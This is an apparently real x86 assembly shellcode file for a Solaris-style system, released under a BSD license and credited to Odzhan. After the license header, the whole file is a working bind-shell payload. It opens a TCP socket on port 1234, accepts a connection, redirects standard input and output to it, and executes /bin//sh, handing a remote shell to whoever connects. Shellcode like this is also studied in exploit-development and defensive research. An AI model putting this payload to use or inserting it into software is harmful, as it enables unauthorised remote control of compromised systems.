;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    
    bits   32
    
    xor    eax, eax
    mov    edx, ~0xD2040002 & 0xFFFFFFFF
    not    edx
    push   eax          ; sa.sin_addr = ADDR_ANY
    push   edx          ; sa.sin_port = 1234, sa.sin_family=AF_INET
    mov    edi, esp     ; edi = &sa
    
    ; step 1
    ; so_socket (AF_INET, SOCK_STREAM, IPPROTO_IP, 0, SOV_SOCKSTREAM);
    xor    ebx, ebx
    mul    ebx
    mov    al, 2
    push   eax          ; sov_sockstream=2
    push   edx          ; path=0
    push   edx          ; IPPROTO_IP=0
    push   eax          ; SOCK_STREAM=2
    push   eax          ; AF_INET=2
    push   eax
    mov    al, 230
    int    0x91

    xchg   eax, ebx
    
    ; step 2
    ; bind (s, &sa, sizeof(sa), SOV_SOCKSTREAM);
    push   16
    push   edi          ; &sa
    push   ebx          ; s
    push   edx
    mov    al, 232      ; sys_bind         
    int    0x91
    
    ; step 3, listen for incoming connections
    ; listen (s, 0);
    push   edx
    push   ebx          ; s
    push   edx
    mov    al, 233      ; eax=sys_listen
    int    0x91
    
    ; step 4, accept connections
    ; accept (s, 0, 0);
    push   edx          ; 0
    push   ebx          ; s
    push   2            ; 2
    mov    al, 234      ; eax = sys_accept
    int    0x91
    
    ; step 5, assign socket to stdin, stdout and stderr
    ; dup2(r, FILENO_STDIN)
    ; dup2(r, FILENO_STDOUT)
    ; dup2(r, FILENO_STDERR)
    xchg   eax, ebx
    xchg   eax, edx
    cdq
    pop    ecx
    ; dup2 syscall #9 no longer exists
    ; so we emulate it with close() and fcntl()
    ; fildes2 in ecx
    ; fildes in ebx    
    ; edx = 0
dup2:
    ; close(fildes);
    push   ecx
    push   edx
    mov    al, 6
    int    0x91
    ; fid = fcntl(fildes, F_DUP2FD, fildes2);
    push   ecx          ; fileno
    push   9            ; F_DUP2FD
    push   ebx          ; s
    push   edx          ; return address
    mov    al, 62       ; eax = sys_fcntl
    int    0x91
    add    esp, 6*4
    
    dec    ecx
    jns    dup2
    
    ; step 6
    ; execve ("/bin//sh", {"/bin//sh", NULL}, 0, 0);
    push    edx         ; '\0'
    push    '//sh'
    push    '/bin'
    mov     ebx, esp    ; ebx = "/bin//sh", 0
    push    edx         ; NULL
    push    ebx         ; "/bin//sh", 0
    mov     ecx, esp
    push    edx         ; 0
    push    edx         ; 0
    push    ecx         ; argv
    push    ebx         ; "/bin//sh", 0
    push    edx         
    mov     al, 59      ; eax = sys_execve
    int     0x91
    